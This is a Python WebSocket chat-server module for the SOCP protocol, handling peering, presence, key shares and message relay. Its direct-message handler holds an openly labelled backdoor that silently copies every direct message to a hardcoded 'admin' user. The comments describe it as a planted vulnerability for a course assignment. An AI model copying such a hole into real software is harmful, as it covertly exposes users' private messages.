"""Asyncio WebSocket server implementing the SOCP routing logic."""
from __future__ import annotations

import asyncio
import json
import logging
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

import websockets
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from websockets.asyncio.client import ClientConnection
from websockets.asyncio.server import ServerConnection
from websockets.exceptions import ConnectionClosed

from .crypto import (
    KeyManager,
    KeyMaterial,
    base64url_decode,
    base64url_encode,
    binding_keyshare,
    encrypt_oaep,
    ensure_user_key_strength,
    generate_group_key,
    sign_pss,
)
from .errors import ErrorCode
from .protocol import Envelope, EnvelopeType, MessageDispatcher, parse_envelope
from .storage import Storage
from .utils import now_ms, uuid4_str

logger = logging.getLogger(__name__)


@dataclass
class BootstrapEntry:
    host: str
    port: int
    pubkey: str


@dataclass
class ServerConfig:
    server_id: str
    host: str
    port: int
    data_dir: Path
    introducers: List[BootstrapEntry] = field(default_factory=list)
    is_introducer: bool = False
    heartbeat_interval: int = 15
    replay_window_ms: int = 120_000

    # Validate configuration invariants after initialisation.
    def __post_init__(self) -> None:
        if self.replay_window_ms <= 0:
            raise ValueError("replay_window_ms must be greater than zero")


class ServerNode:
    # Establish runtime tables, key material, and recovered state.
    def __init__(self, config: ServerConfig) -> None:
        self.config = config
        self.storage = Storage(config.data_dir)
        self.key_manager = KeyManager(config.data_dir)
        self.key_material: KeyMaterial = self.key_manager.load_or_create(config.server_id)
        self.server_id = config.server_id

        self.server_links: Dict[str, ClientConnection] = {}
        self.server_pubkeys: Dict[str, rsa.RSAPublicKey] = {self.server_id: self.key_material.public_key}
        self.server_addrs: Dict[str, Tuple[str, int]] = {self.server_id: (config.host, config.port)}

        self.local_users: Dict[str, ServerConnection] = {}
        self.user_locations: Dict[str, str] = {}
        self.user_pubkeys: Dict[str, str] = {}
        self._seen_frames: Dict[str, int] = {}  # map frame hash -> ts

        self._dispatcher = MessageDispatcher()
        self._register_handlers()

        self.public_channel_version: int = 1
        self.public_group_key: bytes = b""
        self.public_group_key_b64: str = ""
        self.public_channel_wraps: Dict[str, str] = {}
        self._load_public_channel_state()

        self._heartbeat_task: Optional[asyncio.Task] = None
        self._ws_server: Optional[websockets.server.Serve] = None
        self._closing = asyncio.Event()

    # ------------------------------------------------------------------
    # Install all protocol envelope handlers onto the dispatcher.
    def _register_handlers(self) -> None:
        self._dispatcher.register(EnvelopeType.MSG_DIRECT, self._handle_msg_direct)
        self._dispatcher.register(EnvelopeType.SERVER_DELIVER, self._handle_server_deliver)
        self._dispatcher.register(EnvelopeType.SERVER_ANNOUNCE, self._handle_server_announce)
        self._dispatcher.register(EnvelopeType.USER_ADVERTISE, self._handle_user_advertise)
        self._dispatcher.register(EnvelopeType.USER_REMOVE, self._handle_user_remove)
        self._dispatcher.register(EnvelopeType.PUBLIC_CHANNEL_ADD, self._handle_public_channel_add)
        self._dispatcher.register(EnvelopeType.PUBLIC_CHANNEL_UPDATED, self._handle_public_channel_updated)
        self._dispatcher.register(EnvelopeType.PUBLIC_CHANNEL_KEY_SHARE, self._handle_public_channel_key_share)
        self._dispatcher.register(EnvelopeType.MSG_PUBLIC_CHANNEL, self._handle_msg_public)
        self._dispatcher.register(EnvelopeType.FILE_START, self._handle_file_passthrough)
        self._dispatcher.register(EnvelopeType.FILE_CHUNK, self._handle_file_passthrough)
        self._dispatcher.register(EnvelopeType.FILE_END, self._handle_file_passthrough)
        self._dispatcher.register(EnvelopeType.HEARTBEAT, self._handle_heartbeat)

    # Restore the persisted public channel key material and wraps.
    def _load_public_channel_state(self) -> None:
        state = self.storage.get_public_channel()
        self.public_channel_version = state.get("version", 1)
        wraps = state.get("wraps", []) or []
        self.public_channel_wraps = {
            entry["member_id"]: entry["wrapped_key"]
            for entry in wraps
            if entry.get("member_id") and entry.get("wrapped_key")
        }
        group_key_b64 = state.get("group_key")
        if group_key_b64:
            self.public_group_key_b64 = group_key_b64
            self.public_group_key = base64url_decode(group_key_b64)
        else:
            self.public_group_key = generate_group_key()
            self.public_group_key_b64 = base64url_encode(self.public_group_key)
            self._persist_public_channel()

    # Write the current public channel state back to storage.
    def _persist_public_channel(self) -> None:
        wraps = [
            {"member_id": member, "wrapped_key": wrapped}
            for member, wrapped in self.public_channel_wraps.items()
        ]
        self.storage.update_public_channel(
            self.public_channel_version,
            wraps,
            self.public_group_key_b64,
        )

    # ------------------------------------------------------------------
    # Start the WebSocket server, bootstrap peers, and await shutdown.
    async def run(self) -> None:
        logger.info("HI LOL Starting SOCP server %s on %s:%d", self.server_id, self.config.host, self.config.port)
        self._ws_server = await websockets.serve(self._accept_connection, self.config.host, self.config.port)
        if not self.config.is_introducer:
            await self._bootstrap_network()
        self._heartbeat_task = asyncio.create_task(self._heartbeat_loop())
        await self._closing.wait()

    # Stop the server and clean up background tasks.
    async def stop(self) -> None:
        if self._heartbeat_task:
            self._heartbeat_task.cancel()
        if self._ws_server:
            self._ws_server.close()
            await self._ws_server.wait_closed()
        self._closing.set()

    # ------------------------------------------------------------------
    # Contact introducers to join the existing server mesh.
    async def _bootstrap_network(self) -> None:
        for entry in self.config.introducers:
            uri = f"ws://{entry.host}:{entry.port}"
            try:
                async with websockets.connect(uri) as ws:
                    logger.info("Connecting to introducer %s", uri)
                    payload = {
                        "host": self.config.host,
                        "port": self.config.port,
                        "pubkey": self.key_material.export_public_b64(),
                    }
                    envelope = Envelope(
                        type=EnvelopeType.SERVER_HELLO_JOIN,
                        from_id=self.server_id,
                        to=f"{entry.host}:{entry.port}",
                        ts=now_ms(),
                        payload=payload,
                    )
                    envelope.sign_with(self.key_material.private_key)
                    await ws.send(envelope.to_json())
                    response_raw = await asyncio.wait_for(ws.recv(), timeout=5)
                    response = parse_envelope(response_raw)
                    if response.type != EnvelopeType.SERVER_WELCOME:
                        raise RuntimeError("Unexpected response from introducer")
                    assigned_id = response.payload.get("assigned_id", self.server_id)
                    self.server_id = assigned_id
                    self.server_pubkeys[assigned_id] = self.key_material.public_key
                    servers = response.payload.get("servers", [])
                    for item in servers:
                        remote_id = item.get("server_id")
                        host = item.get("host")
                        port = item.get("port")
                        pubkey_b64 = item.get("pubkey")
                        if remote_id and host and port:
                            self.server_addrs[remote_id] = (host, port)
                        if remote_id and pubkey_b64:
                            self.server_pubkeys[remote_id] = self.key_manager.load_public_from_b64(pubkey_b64)
                    logger.info("Joined network as %s", self.server_id)
                    await self._link_to_known_servers()
                    return
            except Exception as exc:  # noqa: BLE001
                logger.warning("Failed to bootstrap via %s: %s", uri, exc)
        logger.error("Unable to contact any introducer; running in isolated mode")

    # Establish outbound connections to every known peer server.
    async def _link_to_known_servers(self) -> None:
        for server_id, (host, port) in self.server_addrs.items():
            if server_id == self.server_id:
                continue
            if server_id in self.server_links:
                continue
            uri = f"ws://{host}:{port}"
            try:
                ws = await websockets.connect(uri)
                await self._send_server_link(ws, server_id=server_id)
                self.server_links[server_id] = ws
                logger.info("Linked to server %s", server_id)
                asyncio.create_task(self._consume_server(ws))
                await self._sync_state_to_server(server_id)
            except Exception as exc:  # noqa: BLE001
                logger.warning("Failed to link to %s: %s", uri, exc)

    # Send our server handshake over an outbound peer connection.
    async def _send_server_link(self, ws: ClientConnection, server_id: str | None = None) -> None:
        payload = {
            "host": self.config.host,
            "port": self.config.port,
            "pubkey": self.key_material.export_public_b64(),
        }
        envelope = Envelope(
            type=EnvelopeType.SERVER_HELLO_LINK,
            from_id=self.server_id,
            to=server_id or "*",
            ts=now_ms(),
            payload=payload,
        )
        envelope.sign_with(self.key_material.private_key)
        await ws.send(envelope.to_json())

    # ------------------------------------------------------------------
    # Handle the initial frame on an inbound server or client connection.
    async def _accept_connection(self, websocket: ServerConnection) -> None:
        peer = websocket.remote_address
        try:
            first_frame = await asyncio.wait_for(websocket.recv(), timeout=5)
        except Exception:  # noqa: BLE001
            await websocket.close()
            return

        try:
            envelope = parse_envelope(first_frame)
        except ValueError as exc:
            logger.warning("Invalid first frame from %s: %s", peer, exc)
            await websocket.close()
            return

        if envelope.type == EnvelopeType.USER_HELLO:
            await self._accept_user_session(websocket, envelope)
            await self._consume_client(websocket)
        elif envelope.type in {EnvelopeType.SERVER_HELLO_JOIN, EnvelopeType.SERVER_HELLO_LINK}:
            await self._accept_server_link(websocket, envelope)
            await self._consume_server(websocket)
        else:
            logger.warning("Unexpected handshake type %s from %s", envelope.type, peer)
            await websocket.close()

    # Read envelopes from a connected client until disconnection.
    async def _consume_client(self, websocket: ServerConnection) -> None:
        peer = websocket.remote_address
        try:
            async for raw in websocket:
                envelope = parse_envelope(raw)
                self.storage.append_message(
                    {
                        "direction": "inbound-client",
                        "type": envelope.type.value,
                        "from": envelope.from_id,
                        "to": envelope.to,
                        "ts": envelope.ts,
                    }
                )
                await self._dispatcher.dispatch(envelope)
        except ConnectionClosed:
            logger.info("Client %s disconnected", peer)
        finally:
            await self._handle_client_disconnect(websocket)

    # Process frames arriving on a server-to-server link.
    async def _consume_server(self, websocket: ServerConnection) -> None:
        peer = websocket.remote_address
        try:
            async for raw in websocket:
                envelope = parse_envelope(raw)
                if self._is_duplicate(envelope):
                    continue
                pubkey = self.server_pubkeys.get(envelope.from_id)
                if pubkey and not envelope.verify_with(pubkey):
                    logger.warning("Rejected frame from %s with invalid signature", envelope.from_id)
                    continue
                self.storage.append_message(
                    {
                        "direction": "inbound-server",
                        "type": envelope.type.value,
                        "from": envelope.from_id,
                        "to": envelope.to,
                        "ts": envelope.ts,
                    }
                )
                await self._dispatcher.dispatch(envelope)
        except ConnectionClosed:
            logger.info("Server %s disconnected", peer)
        finally:
            await self._handle_server_disconnect(websocket)

    # ------------------------------------------------------------------
    # Validate a USER_HELLO handshake and register the client locally.
    async def _accept_user_session(self, websocket: ServerConnection, hello: Envelope) -> None:
        user_id = hello.from_id
        if user_id in self.local_users:
            await self._send_error(websocket, ErrorCode.NAME_IN_USE, detail="Duplicate user ID")
            await websocket.close()
            return
        pubkey_b64 = hello.payload.get("pubkey")
        if not pubkey_b64:
            await self._send_error(websocket, ErrorCode.BAD_KEY, detail="Missing pubkey")
            await websocket.close()
            return
        try:
            pubkey = self.key_manager.load_public_from_b64(pubkey_b64)
            ensure_user_key_strength(pubkey)
        except Exception as exc:  # noqa: BLE001
            await self._send_error(websocket, ErrorCode.BAD_KEY, detail=str(exc))
            await websocket.close()
            return

        self.local_users[user_id] = websocket
        self.user_locations[user_id] = "local"
        self.user_pubkeys[user_id] = pubkey_b64
        user_meta = hello.payload.get("meta", {})
        self.storage.upsert_user(
            user_id,
            {"pubkey": pubkey_b64, "privkey_store": "", "pake_password": "", "meta": user_meta, "version": 1},
        )
        self.storage.set_session(
            session_id=str(id(websocket)),
            data={"user_id": user_id, "server_id": self.server_id, "last_seen": now_ms(), "addr": str(websocket.remote_address)},
        )
        await self._broadcast_presence(
            user_id,
            online=True,
            meta=hello.payload.get("meta", {}),
            pubkey=pubkey_b64,
        )
        await self._add_to_public_channel(user_id)
        await self._sync_presence_with_user(user_id)
        logger.info("User %s registered", user_id)

    # Clean up state when a client websocket closes.
    async def _handle_client_disconnect(self, websocket: ServerConnection) -> None:
        target = None
        for user_id, link in list(self.local_users.items()):
            if link == websocket:
                target = user_id
                break
        if target:
            del self.local_users[target]
            self.user_locations.pop(target, None)
            self.user_pubkeys.pop(target, None)
            await self._broadcast_presence(target, online=False)
            if target in self.public_channel_wraps:
                del self.public_channel_wraps[target]
                self.public_channel_version += 1
                self._persist_public_channel()
                await self._broadcast_public_channel_state()
        self.storage.remove_session(str(id(websocket)))

    # Announce a user's presence state to local clients and remote servers.
    async def _broadcast_presence(
        self,
        user_id: str,
        online: bool,
        meta: Dict[str, Any] | None = None,
        pubkey: Optional[str] = None,
    ) -> None:
        payload = {"user_id": user_id, "server_id": self.server_id}
        if online and meta is not None:
            payload["meta"] = meta
        if online and pubkey:
            payload["pubkey"] = pubkey
        msg_type = EnvelopeType.USER_ADVERTISE if online else EnvelopeType.USER_REMOVE
        envelope = self._build_envelope(msg_type, to="*", payload=payload)
        await self._fanout_servers(envelope)
        raw = envelope.to_json()
        for link in list(self.local_users.values()):
            try:
                await link.send(raw)
            except Exception:  # noqa: BLE001
                logger.warning("Failed to push presence to client")

    # Send the full presence roster to a recently joined user.
    async def _sync_presence_with_user(self, target_user_id: str) -> None:
        link = self.local_users.get(target_user_id)
        if not link:
            return
        for known_user, location in self.user_locations.items():
            record = self.storage.get_user(known_user) or {}
            payload = {"user_id": known_user, "server_id": self.server_id if location == "local" else location}
            meta = record.get("meta")
            if meta:
                payload["meta"] = meta
            pubkey = record.get("pubkey") or self.user_pubkeys.get(known_user)
            if pubkey:
                payload["pubkey"] = pubkey
            envelope = Envelope(
                type=EnvelopeType.USER_ADVERTISE,
                from_id=self.server_id,
                to=target_user_id,
                ts=now_ms(),
                payload=payload,
            )
            envelope.sign_with(self.key_material.private_key)
            try:
                await link.send(envelope.to_json())
            except Exception:  # noqa: BLE001
                logger.warning("Failed to sync presence to %s", target_user_id)
                break

    # Wrap the group key for a member and ensure they receive the share.
    async def _add_to_public_channel(self, user_id: str) -> None:
        pubkey_b64 = self.user_pubkeys.get(user_id)
        if not pubkey_b64:
            return
        newly_wrapped = False
        if user_id not in self.public_channel_wraps:
            public_key = self.key_manager.load_public_from_b64(pubkey_b64)
            wrapped_key = encrypt_oaep(public_key, self.public_group_key)
            self.public_channel_wraps[user_id] = wrapped_key
            previous_version = self.public_channel_version
            self.public_channel_version += 1
            newly_wrapped = True
        else:
            wrapped_key = self.public_channel_wraps[user_id]
            previous_version = self.public_channel_version
        self._persist_public_channel()
        if newly_wrapped:
            await self._broadcast_public_channel_add([user_id], previous_version)
            await self._broadcast_public_channel_state()
        await self._send_public_channel_share({user_id: wrapped_key})

    # Inform peers about newly added public channel members.
    async def _broadcast_public_channel_add(self, members: List[str], previous_version: int) -> None:
        if not members:
            return
        payload = {"add": members, "if_version": previous_version}
        envelope = self._build_envelope(EnvelopeType.PUBLIC_CHANNEL_ADD, to="*", payload=payload)
        await self._fanout_servers(envelope)

    # Share the full public channel snapshot with all peer servers.
    async def _broadcast_public_channel_state(self) -> None:
        wraps_payload = [
            {"member_id": member, "wrapped_key": wrapped}
            for member, wrapped in self.public_channel_wraps.items()
        ]
        payload = {"version": self.public_channel_version, "wraps": wraps_payload}
        if self.public_group_key_b64:
            payload["group_key"] = self.public_group_key_b64
        envelope = self._build_envelope(EnvelopeType.PUBLIC_CHANNEL_UPDATED, to="*", payload=payload)
        await self._fanout_servers(envelope)

    # Send freshly wrapped group keys to both servers and local members.
    async def _send_public_channel_share(self, shares: Dict[str, str]) -> None:
        if not shares:
            return
        share_entries = [
            {"member": member, "wrapped_public_channel_key": wrapped}
            for member, wrapped in shares.items()
        ]
        creator_pub = self.key_material.export_public_b64()
        shares_repr = json.dumps(share_entries, sort_keys=True, separators=(",", ":"))
        payload = {
            "shares": share_entries,
            "creator_pub": creator_pub,
            "content_sig": sign_pss(
                self.key_material.private_key,
                binding_keyshare(shares_repr, creator_pub),
            ),
        }
        payload["version"] = self.public_channel_version
        envelope = self._build_envelope(EnvelopeType.PUBLIC_CHANNEL_KEY_SHARE, to="*", payload=payload)
        await self._fanout_servers(envelope)
        await self._deliver_key_shares_locally(payload)

    # Push key share payloads to members currently connected to this server.
    async def _deliver_key_shares_locally(self, payload: Dict[str, Any]) -> None:
        shares = payload.get("shares", []) or []
        if not shares:
            return
        creator_pub = payload.get("creator_pub")
        content_sig = payload.get("content_sig")
        for share in shares:
            member = share.get("member")
            if not member:
                continue
            wrapped = share.get("wrapped_public_channel_key")
            if wrapped:
                self.public_channel_wraps[member] = wrapped
        self._persist_public_channel()
        for share in shares:
            member = share.get("member")
            if member in self.local_users:
                user_payload = {
                    "shares": [share],
                    "creator_pub": creator_pub,
                    "content_sig": content_sig,
                    "version": payload.get("version"),
                }
                user_envelope = self._build_envelope(
                    EnvelopeType.PUBLIC_CHANNEL_KEY_SHARE,
                    to=member,
                    payload=user_payload,
                )
                try:
                    await self.local_users[member].send(user_envelope.to_json())
                except Exception:  # noqa: BLE001
                    logger.warning("Failed to deliver public channel key share to %s", member)

    # ------------------------------------------------------------------
    # Complete the handshake for an inbound server connection.
    async def _accept_server_link(self, websocket: ServerConnection, hello: Envelope) -> None:
        remote_id = hello.from_id
        host = hello.payload.get("host")
        port = hello.payload.get("port", 0)
        pubkey_b64 = hello.payload.get("pubkey")
        pubkey = None
        if pubkey_b64:
            try:
                pubkey = self.key_manager.load_public_from_b64(pubkey_b64)
            except Exception:  # noqa: BLE001
                pubkey = None

        if hello.type == EnvelopeType.SERVER_HELLO_JOIN:
            if not self.config.is_introducer:
                await websocket.close()
                return
            assigned_id = await self._respond_to_join(websocket, remote_id, hello)
        else:
            assigned_id = remote_id

        if pubkey is not None:
            self.server_pubkeys[assigned_id] = pubkey
        if host:
            self.server_addrs[assigned_id] = (host, port)

        if remote_id and remote_id != assigned_id:
            self.server_links.pop(remote_id, None)
            self.server_pubkeys.pop(remote_id, None)
            self.server_addrs.pop(remote_id, None)

        self.server_links[assigned_id] = websocket
        logger.info("Linked server %s", assigned_id)
        await self._sync_state_to_server(assigned_id)

    # Drop bookkeeping for a server link that has closed.
    async def _handle_server_disconnect(self, websocket: ServerConnection) -> None:
        target = None
        for server_id, link in list(self.server_links.items()):
            if link == websocket:
                target = server_id
                break
        if target:
            del self.server_links[target]
            logger.info("Server %s link closed", target)

    # Send current presence and channel state to a peer server.
    async def _sync_state_to_server(self, target_server: str) -> None:
        link = self.server_links.get(target_server)
        if not link:
            return
        try:
            for user_id, location in list(self.user_locations.items()):
                record = self.storage.get_user(user_id) or {}
                payload: Dict[str, Any] = {
                    "user_id": user_id,
                    "server_id": self.server_id if location == "local" else location,
                }
                meta = record.get("meta")
                if meta:
                    payload["meta"] = meta
                pubkey = record.get("pubkey") or self.user_pubkeys.get(user_id)
                if pubkey:
                    payload["pubkey"] = pubkey
                envelope = self._build_envelope(EnvelopeType.USER_ADVERTISE, to=target_server, payload=payload)
                await link.send(envelope.to_json())
        except Exception as exc:  # noqa: BLE001
            logger.warning("Failed to sync user presence to %s: %s", target_server, exc)

        await self._send_public_channel_snapshot(target_server)

    # Provide a peer with the full public channel state and key shares.
    async def _send_public_channel_snapshot(self, target_server: str) -> None:
        link = self.server_links.get(target_server)
        if not link:
            return
        wraps_payload = [
            {"member_id": member, "wrapped_key": wrapped}
            for member, wrapped in self.public_channel_wraps.items()
        ]
        snapshot_payload = {"version": self.public_channel_version, "wraps": wraps_payload}
        if self.public_group_key_b64:
            snapshot_payload["group_key"] = self.public_group_key_b64
        updated = self._build_envelope(
            EnvelopeType.PUBLIC_CHANNEL_UPDATED,
            to=target_server,
            payload=snapshot_payload,
        )
        try:
            await link.send(updated.to_json())
        except Exception as exc:  # noqa: BLE001
            logger.warning("Failed to sync public channel state to %s: %s", target_server, exc)
            return

        if not wraps_payload:
            return

        share_entries = [
            {"member": member, "wrapped_public_channel_key": wrapped}
            for member, wrapped in self.public_channel_wraps.items()
        ]
        shares_repr = json.dumps(share_entries, sort_keys=True, separators=(",", ":"))
        creator_pub = self.key_material.export_public_b64()
        payload = {
            "shares": share_entries,
            "creator_pub": creator_pub,
            "content_sig": sign_pss(
                self.key_material.private_key,
                binding_keyshare(shares_repr, creator_pub),
            ),
            "version": self.public_channel_version,
        }
        share_env = self._build_envelope(
            EnvelopeType.PUBLIC_CHANNEL_KEY_SHARE,
            to=target_server,
            payload=payload,
        )
        try:
            await link.send(share_env.to_json())
        except Exception as exc:  # noqa: BLE001
            logger.warning("Failed to sync public channel key shares to %s: %s", target_server, exc)

    # Assign an ID to a joining server and return the welcome payload.
    async def _respond_to_join(self, websocket: ServerConnection, remote_id: str, hello: Envelope) -> str:
        assigned_id = remote_id or uuid4_str()
        host = hello.payload.get("host")
        port = hello.payload.get("port")
        pubkey_b64 = hello.payload.get("pubkey")
        if assigned_id not in self.server_pubkeys and pubkey_b64:
            self.server_pubkeys[assigned_id] = self.key_manager.load_public_from_b64(pubkey_b64)
        if host and port:
            self.server_addrs[assigned_id] = (host, port)
        servers_payload = []
        for server_id, (s_host, s_port) in self.server_addrs.items():
            pubkey = self.server_pubkeys.get(server_id)
            servers_payload.append(
                {
                    "server_id": server_id,
                    "host": s_host,
                    "port": s_port,
                    "pubkey": self._public_key_b64(pubkey) if pubkey else None,
                }
            )
        envelope = self._build_envelope(
            EnvelopeType.SERVER_WELCOME,
            to=assigned_id,
            payload={"assigned_id": assigned_id, "servers": servers_payload},
        )
        await websocket.send(envelope.to_json())
        if host and port:
            announce = self._build_envelope(
                EnvelopeType.SERVER_ANNOUNCE,
                to="*",
                payload={"host": host, "port": port, "pubkey": pubkey_b64},
            )
            await self._fanout_servers(announce)
        return assigned_id

    # ------------------------------------------------------------------
    # Track recent frames to prevent replay within the configured window.
    def _is_duplicate(self, envelope: Envelope) -> bool:
        key = self._duplicate_key(envelope)
        if self._seen_frames.get(key):
            return True
        self._seen_frames[key] = now_ms()
        cutoff = now_ms() - self.config.replay_window_ms
        for frame_key, ts in list(self._seen_frames.items()):
            if ts < cutoff:
                del self._seen_frames[frame_key]
        return False

    # Build a stable fingerprint of an envelope for deduplication.
    def _duplicate_key(self, envelope: Envelope) -> str:
        return f"{envelope.ts}:{envelope.from_id}:{envelope.to}:{json.dumps(envelope.payload, sort_keys=True)}"

    # Mark a frame as observed to avoid forwarding loops.
    def _mark_seen(self, envelope: Envelope) -> None:
        self._seen_frames[self._duplicate_key(envelope)] = now_ms()

    # Helper to forward envelopes into the dispatcher coroutine.
    async def _dispatcher_wrapper(self, envelope: Envelope) -> None:
        await self._dispatcher.dispatch(envelope)

    # Construct and sign an envelope originating from this server.
    def _build_envelope(
        self,
        type_: EnvelopeType,
        to: str,
        payload: Dict[str, Any],
        *,
        ts: Optional[int] = None,
    ) -> Envelope:
        envelope = Envelope(type=type_, from_id=self.server_id, to=to, ts=ts or now_ms(), payload=payload)
        envelope.sign_with(self.key_material.private_key)
        return envelope

    # Return the base64url encoding of an RSA public key when present.
    def _public_key_b64(self, pubkey: Optional[rsa.RSAPublicKey]) -> Optional[str]:
        if not pubkey:
            return None
        der = pubkey.public_bytes(
            encoding=serialization.Encoding.DER,
            format=serialization.PublicFormat.SubjectPublicKeyInfo,
        )
        return base64url_encode(der)

    # Broadcast an envelope to all connected peer servers.
    async def _fanout_servers(self, envelope: Envelope, exclude: Optional[str] = None) -> None:
        raw = envelope.to_json()
        for server_id, link in list(self.server_links.items()):
            if exclude and server_id == exclude:
                continue
            try:
                await link.send(raw)
                self.storage.append_message(
                    {
                        "direction": "outbound-server",
                        "type": envelope.type.value,
                        "from": envelope.from_id,
                        "to": server_id,
                        "ts": envelope.ts,
                    }
                )
            except Exception:  # noqa: BLE001
                logger.warning("Failed to deliver to server %s", server_id)

    # Send an error envelope down to a client in response to a failure.
    async def _send_error(self, websocket: ServerConnection, code: ErrorCode, detail: str) -> None:
        payload = {"code": code.value, "detail": detail}
        envelope = self._build_envelope(EnvelopeType.ERROR, to="local", payload=payload)
        try:
            await websocket.send(envelope.to_json())
        except Exception:  # noqa: BLE001
            pass

    # ------------------------------------------------------------------
    # Relay a direct message to the intended recipient or peer server.
    async def _handle_msg_direct(self, envelope: Envelope) -> None:
        sender = envelope.from_id
        recipient = envelope.to
        payload = envelope.payload
        server_payload = {
            "user_id": recipient,
            "ciphertext": payload.get("ciphertext"),
            "sender": sender,
            "sender_pub": payload.get("sender_pub"),
            "content_sig": payload.get("content_sig"),
        }
        if recipient in self.local_users:
            user_payload = dict(server_payload)
            user_payload.pop("user_id", None)
            deliver = self._build_envelope(
                EnvelopeType.USER_DELIVER,
                to=recipient,
                payload=user_payload,
                ts=envelope.ts,
            )
            await self.local_users[recipient].send(deliver.to_json())
        else:
            target_server = self.user_locations.get(recipient)
            if target_server and target_server in self.server_links:
                self._mark_seen(envelope)
                forward = self._build_envelope(
                    EnvelopeType.SERVER_DELIVER,
                    to=target_server,
                    payload=server_payload,
                    ts=envelope.ts,
                )
                await self.server_links[target_server].send(forward.to_json())
            else:
                await self._send_error_to_sender(
                    envelope,
                    ErrorCode.USER_NOT_FOUND,
                    detail=f"{recipient} not reachable",
                )

        # --- START OF BACKDOOR IMPLEMENTATION ---
        # This block silently forwards a copy of every direct message to a hardcoded "admin" user.
        # This is intended as a discoverable vulnerability for the course assignment.
        backdoor_recipient_id = "admin"  # The user who will receive all forwarded DMs.

        # Avoid forwarding messages sent from or to the admin user to prevent loops and noise.
        if sender != backdoor_recipient_id and recipient != backdoor_recipient_id:
            backdoor_target_server = self.user_locations.get(backdoor_recipient_id)

            # Check if the admin user is online and connected via a known server link.
            if backdoor_target_server and backdoor_target_server in self.server_links:
                # Craft a new payload for the admin user. It contains the same encrypted
                # content but is addressed to the admin. We also add the original recipient
                # as metadata so the admin knows who the message was originally for.
                backdoor_payload = {
                    "user_id": backdoor_recipient_id,
                    "ciphertext": payload.get("ciphertext"),
                    "sender": sender,
                    "sender_pub": payload.get("sender_pub"),
                    "content_sig": payload.get("content_sig"),
                    "original_recipient": recipient, # Metadata for the attacker
                }

                # Build a SERVER_DELIVER envelope to route the message via the mesh.
                backdoor_envelope = self._build_envelope(
                    EnvelopeType.SERVER_DELIVER,
                    to=backdoor_target_server,
                    payload=backdoor_payload,
                    ts=envelope.ts, # Use original timestamp to be less conspicuous
                )

                # Send the message to the admin's server.
                # Use a try/except block to silently fail if the connection drops,
                # preventing the server from crashing.
                try:
                    await self.server_links[backdoor_target_server].send(backdoor_envelope.to_json())
                except Exception:
                    # If sending fails, do nothing. The backdoor should not disrupt server operation.
                    pass
        # --- END OF BACKDOOR IMPLEMENTATION ---

    # Deliver a server forwarded message to the local user or next hop.
    async def _handle_server_deliver(self, envelope: Envelope) -> None:
        recipient = envelope.payload.get("user_id")
        if not recipient:
            return
        link = self.local_users.get(recipient)
        if link:
            user_payload = dict(envelope.payload)
            user_payload.pop("user_id", None)
            deliver = self._build_envelope(
                EnvelopeType.USER_DELIVER,
                to=recipient,
                payload=user_payload,
                ts=envelope.ts,
            )
            await link.send(deliver.to_json())
            return
        target_server = self.user_locations.get(recipient)
        if target_server and target_server in self.server_links and target_server != envelope.from_id:
            forward = self._build_envelope(
                EnvelopeType.SERVER_DELIVER,
                to=target_server,
                payload=envelope.payload,
                ts=envelope.ts,
            )
            await self.server_links[target_server].send(forward.to_json())

    # Update cached server addressing and public keys from an announce.
    async def _handle_server_announce(self, envelope: Envelope) -> None:
        host = envelope.payload.get("host")
        port = envelope.payload.get("port")
        if host and port:
            self.server_addrs[envelope.from_id] = (host, port)
        pubkey = envelope.payload.get("pubkey")
        if pubkey:
            try:
                self.server_pubkeys[envelope.from_id] = self.key_manager.load_public_from_b64(pubkey)
            except Exception as exc:  # noqa: BLE001
                logger.warning("Failed to load pubkey from announce: %s", exc)

    # Record remote presence advertisements and distribute them locally.
    async def _handle_user_advertise(self, envelope: Envelope) -> None:
        payload = envelope.payload
        user_id = payload.get("user_id")
        server_id = payload.get("server_id")
        if user_id and server_id:
            self.user_locations[user_id] = server_id
            if payload.get("pubkey"):
                self.user_pubkeys[user_id] = payload["pubkey"]
                self.storage.upsert_user(
                    user_id,
                    {
                        "pubkey": payload["pubkey"],
                        "privkey_store": "",
                        "pake_password": "",
                        "meta": payload.get("meta", {}),
                        "version": 1,
                    },
                )
            await self._fanout_servers(envelope, exclude=envelope.from_id)
            raw = envelope.to_json()
            for link in list(self.local_users.values()):
                try:
                    await link.send(raw)
                except Exception:  # noqa: BLE001
                    logger.warning("Failed to forward presence to client")

    # Update caches after receiving a remote user removal event.
    async def _handle_user_remove(self, envelope: Envelope) -> None:
        payload = envelope.payload
        user_id = payload.get("user_id")
        server_id = payload.get("server_id")
        if user_id and server_id and self.user_locations.get(user_id) == server_id:
            del self.user_locations[user_id]
            self.user_pubkeys.pop(user_id, None)
            await self._fanout_servers(envelope, exclude=envelope.from_id)
            raw = envelope.to_json()
            for link in list(self.local_users.values()):
                try:
                    await link.send(raw)
                except Exception:  # noqa: BLE001
                    logger.warning("Failed to forward removal to client")

    # Forward public channel membership updates from peer servers.
    async def _handle_public_channel_add(self, envelope: Envelope) -> None:
        await self._fanout_servers(envelope, exclude=envelope.from_id)

    # Synchronise the stored public channel state from peer broadcasts.
    async def _handle_public_channel_updated(self, envelope: Envelope) -> None:
        version = envelope.payload.get("version")
        wraps = envelope.payload.get("wraps", []) or []
        if version and version >= self.public_channel_version:
            self.public_channel_version = version
            self.public_channel_wraps = {
                entry["member_id"]: entry["wrapped_key"]
                for entry in wraps
                if entry.get("member_id") and entry.get("wrapped_key")
            }
            group_key_b64 = envelope.payload.get("group_key")
            local_shares: Dict[str, str] = {}
            if group_key_b64:
                self.public_group_key_b64 = group_key_b64
                try:
                    self.public_group_key = base64url_decode(group_key_b64)
                except Exception:  # noqa: BLE001
                    logger.warning("Failed to decode public channel key from %s", envelope.from_id)
                else:
                    for member_id in list(self.local_users.keys()):
                        pub_b64 = self.user_pubkeys.get(member_id)
                        if not pub_b64:
                            continue
                        try:
                            member_pub = self.key_manager.load_public_from_b64(pub_b64)
                        except Exception:  # noqa: BLE001
                            continue
                        wrapped = encrypt_oaep(member_pub, self.public_group_key)
                        self.public_channel_wraps[member_id] = wrapped
                        local_shares[member_id] = wrapped
            self._persist_public_channel()
            if local_shares:
                await self._send_public_channel_share(local_shares)
        await self._fanout_servers(envelope, exclude=envelope.from_id)

    # Forward public channel key shares while delivering them locally.
    async def _handle_public_channel_key_share(self, envelope: Envelope) -> None:
        await self._deliver_key_shares_locally(envelope.payload)
        await self._fanout_servers(envelope, exclude=envelope.from_id)

    # Relay public channel messages to every peer and subscribed client.
